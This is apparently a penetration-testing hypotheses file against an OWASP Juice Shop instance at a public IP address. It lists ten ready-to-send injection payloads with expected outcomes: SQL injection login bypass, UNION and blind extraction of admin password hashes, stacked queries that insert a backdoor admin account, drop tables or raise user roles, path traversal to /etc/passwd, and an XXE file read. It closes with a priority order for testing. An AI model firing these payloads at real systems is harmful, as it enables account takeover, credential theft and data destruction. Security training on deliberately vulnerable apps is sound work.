# Injection Attack Hypotheses - OWASP Juice Shop

**Target:** http://54.146.141.88:3000  
**Analysis Date:** $(date)  
**Focus:** SQL Injection, NoSQL Injection, Command Injection

## Hypotheses

### Hypothesis 1
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q
**Payload:** `' OR 1=1--`
**Expected Result:** Returns all products (30+ items) instead of empty search results, confirming boolean-based SQL injection
**Evidence from recon:** Direct SQL concatenation identified at routes/search.ts:23 - `"SELECT * FROM Products WHERE ((name LIKE '%" + criteria + "%' OR description LIKE '%" + criteria + "%') AND deletedAt IS NULL) ORDER BY name"`. No sanitization applied to `req.query.q` parameter.

### Hypothesis 2
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q  
**Payload:** `' UNION SELECT sql,name,description,price,id,image,createdAt,updatedAt,deletedAt FROM sqlite_master WHERE type='table'--`
**Expected Result:** Database schema exposure - returns table definitions from sqlite_master, revealing database structure
**Evidence from recon:** Same SQL concatenation sink as Hypothesis 1, using SQLite backend (version 5.1.7 confirmed in package.json). Union-based injection should work with 9 columns in Products table.

### Hypothesis 3
**Endpoint:** POST /rest/user/login
**Parameter:** email (JSON body)
**Payload:** `{"email": "' OR 1=1--", "password": "dummy"}`
**Expected Result:** Authentication bypass - returns valid JWT token without correct credentials, allowing unauthorized access
**Evidence from recon:** Direct SQL concatenation at routes/login.ts:34 - `"SELECT * FROM Users WHERE email = '" + req.body.email + "' AND password = '" + security.hash(req.body.password) + "' AND deletedAt IS NULL"`. Email parameter directly concatenated without sanitization.

### Hypothesis 4
**Endpoint:** POST /rest/user/login  
**Parameter:** email (JSON body)
**Payload:** `{"email": "' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive FROM Users WHERE role='admin'--", "password": "x"}`
**Expected Result:** Admin user data extraction - reveals admin credentials, password hashes, and sensitive user information
**Evidence from recon:** Same login SQL injection sink, targeting Users table for privilege escalation. Admin role enumeration possible due to direct query access.

### Hypothesis 5
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q
**Payload:** `' AND (SELECT COUNT(*) FROM Users WHERE email LIKE 'admin%')>0 AND SUBSTR((SELECT password FROM Users WHERE role='admin' LIMIT 1),1,1)='a'--`
**Expected Result:** Blind SQL injection - boolean response based on admin password hash characters, enabling character-by-character password extraction
**Evidence from recon:** Leverages the same SQL concatenation vulnerability but uses blind injection techniques to extract sensitive data when direct union queries might be detected.

### Hypothesis 6
**Endpoint:** GET /rest/products/search?q=  
**Parameter:** q
**Payload:** `'; INSERT INTO Users (email,password,role) VALUES ('injected@test.com','5d41402abc4b2a76b9719d911017c592','admin');--`
**Expected Result:** SQL injection with data modification - creates new admin user account for persistent access
**Evidence from recon:** Same concatenation vulnerability allows stacked queries in SQLite. Could enable persistent backdoor creation if application allows multiple SQL statements.

### Hypothesis 7
**Endpoint:** POST /api/Feedbacks
**Parameter:** comment (JSON body)  
**Payload:** `{"comment": "'; DROP TABLE Products;--", "rating": 5, "UserId": 1}`
**Expected Result:** SQL injection in feedback system - potential database destruction or data corruption
**Evidence from recon:** Feedback endpoint processes comment field, and while primarily an XSS sink (bypassSecurityTrustHtml), the data flow may include database operations susceptible to injection if raw queries are used in the backend processing.

### Hypothesis 8
**Endpoint:** GET /ftp/:file
**Parameter:** file (URL parameter)
**Payload:** `../../../etc/passwd`  
**Expected Result:** Path traversal leading to command injection context - accessing system files that might contain scripts or configurations that could be leveraged for command execution
**Evidence from recon:** routes/fileServer.ts:33 uses `res.sendFile(path.resolve('ftp/', file))` with insufficient sanitization. While primarily path traversal (CWE-22), accessing script files or configuration files could enable command injection scenarios.

### Hypothesis 9
**Endpoint:** POST /file-upload
**Parameter:** file (multipart upload)
**Payload:** XML file containing `<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>`
**Expected Result:** XML External Entity (XXE) injection leading to file disclosure or potential command execution through XML processing
**Evidence from recon:** server.ts:304 includes `handleXmlUpload` function for XML file processing. XXE attacks can sometimes lead to command injection depending on the XML parser configuration and system setup.

### Hypothesis 10
**Endpoint:** PUT /api/BasketItems/:id
**Parameter:** quantity (JSON body)
**Payload:** `{"quantity": "1'; UPDATE Users SET role='admin' WHERE id=1;--", "BasketId": 1}`
**Expected Result:** SQL injection through basket quantity parameter - privilege escalation by modifying user roles
**Evidence from recon:** routes/basketItems.ts handles quantity updates. If the quantity parameter is used in raw SQL queries without proper parameterization, it could enable SQL injection for privilege escalation.

## Priority Assessment

**CRITICAL (Immediate Testing):**
- Hypothesis 1, 2: Search endpoint SQL injection (publicly accessible, no auth required)
- Hypothesis 3, 4: Login SQL injection (authentication bypass potential)

**HIGH (Secondary Testing):**  
- Hypothesis 5, 6: Advanced SQL injection techniques
- Hypothesis 7: Feedback system injection

**MEDIUM (Tertiary Testing):**
- Hypothesis 8, 9, 10: File-based and parameter injection vectors

## Testing Notes

- **SQLite Syntax:** All SQL payloads designed for SQLite 5.1.7 compatibility
- **Sequelize Context:** Payloads account for Sequelize ORM raw query patterns  
- **Error Handling:** Monitor for SQL error messages in responses to refine payloads
- **Authentication:** Some endpoints require valid JWT - use authentication bypass first if successful
- **Rate Limiting:** Only present on password reset endpoint - other endpoints unrestricted